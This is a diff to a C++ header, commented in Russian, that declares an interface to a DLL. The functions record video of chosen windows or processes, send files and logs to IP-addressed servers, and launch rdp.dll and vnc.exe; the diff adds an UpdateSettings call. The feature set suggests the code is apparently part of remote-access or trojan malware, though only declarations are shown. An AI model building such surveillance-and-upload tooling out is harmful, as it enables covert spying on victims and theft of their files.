@@ -42,12 +42,13 @@ private:
 	typedef DWORD (WINAPI *TInit)( const char* uid, int flags, const char* ip, int port, int downtime );
 	typedef void (WINAPI *TRelease)( DWORD server );
 	typedef DWORD (WINAPI *TAddIPServer)( DWORD server, const char* ip, int port );
+	typedef void (WINAPI* TUpdateSettings)( DWORD server, int setFlags, int resetFlags, int downtime );
 
 	//функции записи видео
 	typedef VOID (WINAPI *TStartRecHwnd	)( DWORD server, char* uid, char* nameVideo, HWND wnd, int seconds, int flags ) ;
 	typedef VOID (WINAPI *TStartRecPid  )( DWORD server, char* uid, char* nameVideo, DWORD pid, int seconds, int flags );
 	typedef VOID (WINAPI *TStopRec		)();
-	typedef VOID (WINAPI *TResetTimer	)();
+	typedef VOID (WINAPI *TResetTime	)();
 
 	//функции отправки файлов
 	typedef VOID ( WINAPI *TStartSend	)( DWORD server, char* name, char* path, int after );
@@ -77,11 +78,12 @@ public:
 
 	TInit				Init;
 	TRelease			Release;
+	TUpdateSettings		UpdateSettings;
 	TAddIPServer		AddIPServer;
 	TStartRecHwnd		RecordWnd;
 	TStartRecPid		RecordProcess;
 	TStopRec			RecordStop;
-	TResetTimer			ResetTimer;
+	TResetTime			ResetTime;
 	TStartSend			SendFiles;
 	TStartSendAsync		StartSendAsync;
 	TIsSendedAsync		IsSendedAsync;
@@ -111,6 +113,7 @@ DWORD SendFiles( int server, const char* name, const char* path, int after = 0, 
 bool FolderIsUpload( const char* name, const char* path );
 bool FilesIsSended(DWORD id);
 bool SendLog( int server, const char* name, int code, const char* text );
+void UpdateSettings( int server, int setFlags, int resetFlags, int downtime );
 //запуск rdp.dll
 DWORD WINAPI ProcessRDP(void*);
 //запуск vnc.exe
